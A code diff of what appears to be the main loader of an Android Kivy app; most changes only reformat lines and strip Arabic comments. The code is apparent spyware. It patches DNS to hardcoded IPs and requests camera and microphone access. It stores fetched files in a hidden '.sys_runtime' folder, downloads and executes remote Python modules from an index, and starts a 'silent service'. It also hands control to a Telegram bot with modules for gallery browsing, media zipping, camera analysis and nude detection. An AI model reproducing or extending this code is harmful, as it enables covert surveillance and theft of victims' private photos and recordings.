@@ -1,14 +1,5 @@
 # -*- coding: utf-8 -*-
-import os
-import sys
-import threading
-import importlib
-import requests
-import traceback
-import gc
-import time
-import socket
-import random
+import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -23,10 +14,8 @@ def _patch_dns():
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
         try:
             result = original_getaddrinfo(host, port, family, type, proto, flags)
-            if result:
-                return result
-        except Exception:
-            pass
+            if result: return result
+        except: pass
         override = {
             'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
             'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
@@ -38,7 +27,6 @@ def _patch_dns():
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
         return original_getaddrinfo(host, port, family, type, proto, flags)
     socket.getaddrinfo = patched_getaddrinfo
-
 _patch_dns()
 
 INDEX_BASE_URLS = [
@@ -49,8 +37,7 @@ INDEX_BASE_URLS = [
 
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache'
+    'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
 }
 
 def _get_path():
@@ -59,7 +46,7 @@ def _get_path():
         act = autoclass('org.kivy.android.PythonActivity').mActivity
         base = act.getFilesDir().getPath()
         p = os.path.join(base, ".sys_runtime")
-    except Exception:
+    except:
         p = os.path.join(os.getcwd(), ".sys_runtime")
     os.makedirs(p, exist_ok=True)
     return p
@@ -77,11 +64,9 @@ def _get_root_path():
 
 APP_ROOT = _get_root_path()
 
-# الترتيب: R (المُحمّل) أولاً، ثم APP_ROOT (المضمّن)
-if R not in sys.path:
-    sys.path.insert(0, R)
-if APP_ROOT not in sys.path:
-    sys.path.insert(1, APP_ROOT)   # بعد R مباشرة
+# ترتيب المسارات: R (المُحمّل) أولاً، ثم APP_ROOT (المُضمّن)
+if R not in sys.path: sys.path.insert(0, R)
+if APP_ROOT not in sys.path: sys.path.insert(1, APP_ROOT)
 
 def start_silent_service():
     try:
@@ -103,9 +88,7 @@ def _perms():
     try:
         from android.permissions import request_permissions, Permission
         request_permissions([
-            Permission.INTERNET,
-            Permission.CAMERA,
-            Permission.RECORD_AUDIO,
+            Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
             "android.permission.FOREGROUND_SERVICE"
         ])
     except Exception as e:
@@ -131,8 +114,7 @@ def load_secrets_from_config():
     except ImportError:
         try:
             config_module = importlib.import_module("config")
-        except ImportError:
-            pass
+        except ImportError: pass
     if config_module is None:
         raise Exception("لا يمكن العثور على config_template.py أو config.py في المسار")
     if not hasattr(config_module, 'load_config'):
@@ -147,18 +129,15 @@ class CoreApp(App):
         self.log = TextInput(
             text="", readonly=True,
             background_color=(0.02, 0.02, 0.02, 1),
-            foreground_color=(0.3, 0.9, 0.3, 1),
-            font_size='10sp'
+            foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
         )
         btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
         copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
         copy_btn.bind(on_press=self._copy)
         clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
         clear_btn.bind(on_press=self._clear)
-        btns.add_widget(copy_btn)
-        btns.add_widget(clear_btn)
-        layout.add_widget(self.log)
-        layout.add_widget(btns)
+        btns.add_widget(copy_btn); btns.add_widget(clear_btn)
+        layout.add_widget(self.log); layout.add_widget(btns)
         Clock.schedule_once(self._start, 0.5)
         return layout
 
@@ -166,15 +145,13 @@ class CoreApp(App):
         Clipboard.copy(self.log.text)
         self._log("Log copied to clipboard")
 
-    def _clear(self, _):
-        self.log.text = ""
+    def _clear(self, _): self.log.text = ""
 
     def _log(self, msg, lvl="INFO"):
         ts = datetime.now().strftime("%H:%M:%S")
         def upd(dt):
             self.log.text += f"[{ts}] [{lvl}] {msg}\n"
-            if len(self.log.text) > 15000:
-                self.log.text = self.log.text[-8000:]
+            if len(self.log.text) > 15000: self.log.text = self.log.text[-8000:]
             self.log.cursor = (0, len(self.log.text))
         Clock.schedule_once(upd, 0)
 
@@ -188,25 +165,20 @@ class CoreApp(App):
             try:
                 resp = requests.head(url, timeout=10, verify=True, headers=HEADERS)
                 return True
-            except Exception:
-                continue
+            except: continue
         try:
             requests.get("https://clients3.google.com/generate_204", timeout=10)
             return True
-        except Exception:
-            return False
+        except: return False
 
     def _download_safe(self, url, filename):
         final_path = os.path.join(R, filename)
-        url_with_cache_buster = f"{url}?t={int(time.time())}"
         try:
-            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20)
+            resp = requests.get(f"{url}?t={int(time.time())}", headers=HEADERS, timeout=20)
             if resp.status_code == 200 and len(resp.content) > 200:
-                with open(final_path, 'wb') as f:
-                    f.write(resp.content)
+                with open(final_path, 'wb') as f: f.write(resp.content)
                 return True
-        except Exception as e:
-            self._log(f"Download error for {filename}: {e}", "WARN")
+        except Exception as e: self._log(f"Download error for {filename}: {e}", "WARN")
         return False
 
     def _ensure_model_available(self):
@@ -214,10 +186,8 @@ class CoreApp(App):
         model_dest = os.path.join(MODELS_DIR, model_filename)
         if os.path.exists(model_dest) and os.path.getsize(model_dest) > 4_000_000:
             return True
-        # ابحث في جذر التطبيق (فقط إذا وضعته هناك عمدًا)
         model_src = os.path.join(APP_ROOT, model_filename)
         if os.path.exists(model_src) and os.path.getsize(model_src) > 4_000_000:
-            import shutil
             shutil.copyfile(model_src, model_dest)
             self._log("AI model copied from app package.")
             return True
@@ -228,8 +198,7 @@ class CoreApp(App):
             self._log("AI model already available.")
             return True
         model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
-        if os.path.exists(model_path):
-            os.remove(model_path)
+        if os.path.exists(model_path): os.remove(model_path)
         self._log("Downloading AI model (5.19 MB)...")
         try:
             resp = requests.get(model_url, headers=HEADERS, timeout=60, stream=True)
@@ -237,9 +206,7 @@ class CoreApp(App):
                 total = 0
                 with open(model_path, 'wb') as f:
                     for chunk in resp.iter_content(chunk_size=8192):
-                        if chunk:
-                            f.write(chunk)
-                            total += len(chunk)
+                        if chunk: f.write(chunk); total += len(chunk)
                 if total >= 5_000_000:
                     self._log("AI model downloaded successfully.")
                     return True
@@ -247,12 +214,10 @@ class CoreApp(App):
                     self._log(f"Incomplete download: {total} bytes.", "WARN")
                     os.remove(model_path)
                     return False
-            else:
-                self._log(f"Model download HTTP {resp.status_code}", "ERROR")
+            else: self._log(f"Model download HTTP {resp.status_code}", "ERROR")
         except Exception as e:
             self._log(f"Model download error: {e}", "ERROR")
-            if os.path.exists(model_path):
-                os.remove(model_path)
+            if os.path.exists(model_path): os.remove(model_path)
         return False
 
     def _background_update_task(self):
@@ -263,34 +228,19 @@ class CoreApp(App):
         all_files = []
         for base_url in INDEX_BASE_URLS:
             try:
-                url = f"{base_url}?t={int(time.time())}"
-                resp = requests.get(url, headers=HEADERS, timeout=15)
+                resp = requests.get(f"{base_url}?t={int(time.time())}", headers=HEADERS, timeout=15)
                 if resp.status_code == 200:
                     data = resp.json()
                     all_files = data.get('files', [])
                     break
-            except Exception:
-                continue
-
+            except: continue
         if all_files:
             for file_entry in all_files:
-                name = file_entry.get('name')
-                url = file_entry.get('url')
-                if not name or not url:
-                    continue
-                if name == "engine_v2.tflite":
-                    self._download_model_if_missing(url)
-                else:
-                    self._download_safe(url, name)
-            # إعادة تحميل المكونات الأساسية لتعكس أي تحديثات
-            try:
-                import commands
-                importlib.reload(commands)
-                self._log("Commands module reloaded.")
-            except Exception:
-                pass
-        else:
-            self._log("Could not fetch index.json in background update.", "WARN")
+                name = file_entry.get('name'); url = file_entry.get('url')
+                if not name or not url: continue
+                if name == "engine_v2.tflite": self._download_model_if_missing(url)
+                else: self._download_safe(url, name)
+        else: self._log("Could not fetch index.json in background update.", "WARN")
         self._log("Background update finished.")
 
     def _start(self, _):
@@ -303,7 +253,7 @@ class CoreApp(App):
         # 1. تحميل النموذج المحلي إن وُجد
         self._ensure_model_available()
 
-        # 2. بدء التحديث الخلفي (لا ننتظره)
+        # 2. بدء التحديث الخلفي
         threading.Thread(target=self._background_update_task, daemon=True).start()
 
         # 3. تحميل الإعدادات المحلية
@@ -314,11 +264,10 @@ class CoreApp(App):
             self._log(f"Failed to load secrets: {e}", "ERROR")
             return
 
-        # 4. التحقق من وجود الملفات الأساسية (سواء مضمّنة أو محمّلة)
+        # 4. التحقق من الملفات الأساسية (تبحث في المسارين)
         essential_files = ["telegram_ui.py", "monitor.py", "commands.py"]
         missing = []
         for fname in essential_files:
-            # نبحث في المسارين
             if os.path.exists(os.path.join(R, fname)) or os.path.exists(os.path.join(APP_ROOT, fname)):
                 continue
             missing.append(fname)
@@ -328,23 +277,17 @@ class CoreApp(App):
             return
 
         # 5. تنظيف الوحدات القديمة
-        modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
-                             "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
-                             "config_template", "config"]
-        for mod in modules_to_remove:
-            if mod in sys.modules:
-                del sys.modules[mod]
+        for mod in ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
+                    "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
+                    "config_template", "config"]:
+            if mod in sys.modules: del sys.modules[mod]
         importlib.invalidate_caches()
         gc.collect()
 
         # 6. بدء النظام
         try:
-            import monitor
-            import telegram_ui
-            import commands
-            importlib.reload(monitor)
-            importlib.reload(telegram_ui)
-            importlib.reload(commands)
+            import monitor, telegram_ui, commands
+            importlib.reload(monitor); importlib.reload(telegram_ui); importlib.reload(commands)
 
             UI_Class = getattr(telegram_ui, 'T', None)
             if UI_Class:
@@ -353,12 +296,8 @@ class CoreApp(App):
                 self._log(f"Device ID: {mon.did[:8]}...")
 
                 ui = UI_Class(
-                    m=mon,
-                    active_tokens=active_tokens,
-                    reserve_tokens=reserve_tokens,
-                    ctrl_id=ctrl_id,
-                    vault_id=vault_id,
-                    app_password=secret_password
+                    m=mon, active_tokens=active_tokens, reserve_tokens=reserve_tokens,
+                    ctrl_id=ctrl_id, vault_id=vault_id, app_password=secret_password
                 )
                 mon.ui = ui
                 mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)
@@ -375,9 +314,7 @@ class CoreApp(App):
             self._log(traceback.format_exc(), "TRACE")
             Clock.schedule_once(lambda dt: self._start(None), 60)
 
-    def on_pause(self):
-        return True
-
+    def on_pause(self): return True
     def on_stop(self):
         self._log("App stopped.")
         return True
